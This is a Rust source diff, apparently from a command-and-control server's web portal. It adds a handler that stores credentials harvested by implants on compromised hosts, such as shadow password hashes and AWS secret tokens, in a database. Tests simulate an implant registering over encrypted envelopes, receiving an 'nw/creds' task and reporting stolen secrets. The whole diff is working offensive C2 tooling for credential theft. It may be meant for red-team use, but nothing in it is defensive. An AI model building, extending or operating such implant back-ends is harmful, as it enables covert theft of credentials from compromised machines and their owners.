@@ -119,6 +119,35 @@ async fn process_envelope(
     }
 }
 
+/// Persist credentials carried in an `nw/creds` task result.
+///
+/// The implant emits a JSON array of `Harvested` as this task's stdout. A
+/// payload that does not parse is ignored rather than failing the poll, so a
+/// beacon on an older build — or any other task whose stdout merely happens to
+/// be JSON — still checks in cleanly. This mirrors the standalone C2 server's
+/// handling so both processes behave identically.
+async fn ingest_harvested_credentials(repo: &Repository, session_id: &str, stdout: &[u8]) {
+    if stdout.is_empty() {
+        return;
+    }
+    let Ok(parsed) = serde_json::from_slice::<Vec<nw_profile::creds::Harvested>>(stdout) else {
+        return;
+    };
+    for item in parsed {
+        // A credential that cannot be written is not worth failing the poll
+        // over; the operator can re-harvest.
+        let _ = repo
+            .upsert_credential(
+                session_id,
+                &item.source,
+                &item.cred_type,
+                &item.id,
+                &item.secret,
+            )
+            .await;
+    }
+}
+
 #[cfg(test)]
 async fn process_sealed_poll(repo: &Repository, env: Envelope) -> Result<Envelope, C2Error> {
     process_sealed_poll_with_store(repo, env, None).await
@@ -228,6 +257,7 @@ async fn process_sealed_poll_with_store(
                     .await
                     .map_err(transfer_c2_error)?;
             }
+            ingest_harvested_credentials(repo, &session_id.to_string(), &result.stdout).await;
             result_acks.push(result.task_id);
         }
     }
@@ -1844,6 +1874,165 @@ mod tests {
             .await
             .unwrap();
         assert_eq!(still_one, 1);
+    }
+
+    /// The portal mounts its own C2 handler, so this is the path a beacon
+    /// actually checks in against when the web GUI is the deployed C2. It must
+    /// persist harvested credentials: previously only the standalone
+    /// `nw-server` did, so creds collected through the portal were dropped.
+    #[tokio::test]
+    async fn harvested_credentials_persist_through_the_portal_c2_path() {
+        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
+        crate::db::run_migrations(&pool).await.unwrap();
+        let repo = Repository { pool: pool.clone() };
+        let psk = b"portal-creds-psk";
+        let psk_key = session_key(psk);
+
+        let implant_kp = crypto::KeyPair::generate();
+        let register = Register {
+            hostname: "cred-lab".into(),
+            username: "operator".into(),
+            os: "linux".into(),
+            arch: "x86_64".into(),
+            pid: 4242,
+            addr: "127.0.0.1".into(),
+            os_version: None,
+            executable_path: None,
+            local_addr: None,
+            implant_version: None,
+            interval_ms: None,
+            jitter_ms: None,
+            capabilities: None,
+            session_key: b64(&implant_kp.public_key()),
+        };
+        let register_ct =
+            crypto::encrypt(&psk_key, 1, &serde_json::to_vec(&register).unwrap()).unwrap();
+        let register_wire = Envelope::new(Kind::Register, 1, None, register_ct)
+            .seal(&psk_key)
+            .unwrap();
+        let ack_wire = process_sealed(&repo, psk, register_wire.as_bytes(), "http")
+            .await
+            .unwrap();
+        let ack_env = Envelope::open(&psk_key, std::str::from_utf8(&ack_wire).unwrap()).unwrap();
+        let ack_pt = crypto::decrypt(&psk_key, ack_env.id, &ack_env.encrypted).unwrap();
+        let ack: RegisterAck = serde_json::from_slice(&ack_pt).unwrap();
+
+        let shared = implant_kp
+            .shared_secret(&deb64(&ack.server_pub).unwrap())
+            .unwrap();
+        let key = crypto::derive_key(&shared, crypto::SESSION_SALT);
+
+        let queued = repo
+            .enqueue_task(
+                &ack.session_id.to_string(),
+                "nw/creds",
+                &serde_json::json!([]),
+                5000,
+            )
+            .await
+            .unwrap();
+        let poll = nw_profile::msgs::PollRequest::default();
+        let poll_ct = crypto::encrypt(&key, 2, &serde_json::to_vec(&poll).unwrap()).unwrap();
+        let poll_wire = Envelope::new(Kind::TaskResult, 2, Some(ack.session_id), poll_ct)
+            .seal(&key)
+            .unwrap();
+        let poll_reply_wire = process_sealed(&repo, psk, poll_wire.as_bytes(), "http")
+            .await
+            .unwrap();
+        let poll_reply_env =
+            Envelope::open(&key, std::str::from_utf8(&poll_reply_wire).unwrap()).unwrap();
+        let poll_reply_pt =
+            crypto::decrypt(&key, poll_reply_env.id, &poll_reply_env.encrypted).unwrap();
+        let poll_reply: nw_profile::msgs::PollReply =
+            serde_json::from_slice(&poll_reply_pt).unwrap();
+        let task_id = poll_reply.tasks[0].id;
+        assert_eq!(
+            task_id.to_string(),
+            queued,
+            "the queued nw/creds task is the one delivered"
+        );
+
+        // The implant emits a JSON array of Harvested as this task's stdout.
+        let harvested = serde_json::json!([
+            { "source": "shadow", "cred_type": "hash", "id": "root:$6$lab", "secret": "lab-hash" },
+            { "source": "env", "cred_type": "token", "id": "AWS_SECRET", "secret": "wJalr" }
+        ]);
+        let completed = nw_profile::msgs::PollRequest {
+            results: vec![nw_profile::msgs::TaskResult {
+                task_id,
+                ok: true,
+                stdout: serde_json::to_vec(&harvested).unwrap(),
+                stderr: Vec::new(),
+                exit_code: 0,
+            }],
+            ..Default::default()
+        };
+        let result_ct = crypto::encrypt(&key, 3, &serde_json::to_vec(&completed).unwrap()).unwrap();
+        let result_wire = Envelope::new(Kind::TaskResult, 3, Some(ack.session_id), result_ct)
+            .seal(&key)
+            .unwrap();
+        let ack_back = process_sealed(&repo, psk, result_wire.as_bytes(), "http")
+            .await
+            .expect("creds result must be accepted, not fail the poll");
+        let ack_back_env = Envelope::open(&key, std::str::from_utf8(&ack_back).unwrap()).unwrap();
+        let ack_back_pt = crypto::decrypt(&key, ack_back_env.id, &ack_back_env.encrypted).unwrap();
+        let ack_back: PollReply = serde_json::from_slice(&ack_back_pt).unwrap();
+        assert_eq!(
+            ack_back.result_acks,
+            vec![task_id],
+            "result is acknowledged"
+        );
+
+        let stored: Vec<(String, String, String)> = sqlx::query_as(
+            "SELECT cred_type, identifier, secret FROM c2_creds WHERE session_id = ? ORDER BY identifier",
+        )
+        .bind(ack.session_id.to_string())
+        .fetch_all(&pool)
+        .await
+        .unwrap();
+        assert_eq!(
+            stored,
+            vec![
+                (
+                    "token".to_owned(),
+                    "AWS_SECRET".to_owned(),
+                    "wJalr".to_owned()
+                ),
+                (
+                    "hash".to_owned(),
+                    "root:$6$lab".to_owned(),
+                    "lab-hash".to_owned()
+                ),
+            ],
+            "both harvested credentials reached the store"
+        );
+    }
+
+    /// Any non-`nw/creds` task whose stdout happens to be JSON must still
+    /// check in cleanly, and must not fabricate credential rows.
+    #[tokio::test]
+    async fn non_credential_task_output_is_not_mistaken_for_credentials() {
+        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
+        crate::db::run_migrations(&pool).await.unwrap();
+        let repo = Repository { pool: pool.clone() };
+        let key = [7u8; crypto::KEY_LEN];
+        let session_id = seed_poll_session(&repo, &key).await;
+
+        // A JSON object, not the Harvested array shape.
+        ingest_harvested_credentials(
+            &repo,
+            &session_id.to_string(),
+            br#"{"unrelated":"payload"}"#,
+        )
+        .await;
+        // And free-form text.
+        ingest_harvested_credentials(&repo, &session_id.to_string(), b"not json at all").await;
+
+        let count: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM c2_creds")
+            .fetch_one(&pool)
+            .await
+            .unwrap();
+        assert_eq!(count, 0, "non-credential output must not create rows");
     }
 
     #[tokio::test]
